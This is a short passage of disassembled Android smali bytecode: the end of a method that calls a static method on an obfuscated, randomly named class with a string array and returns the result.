    invoke-static {p1}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/G;->a([Ljava/lang/String;)Ljava/lang/Void;

    move-result-object v0

    return-object v0
.end method
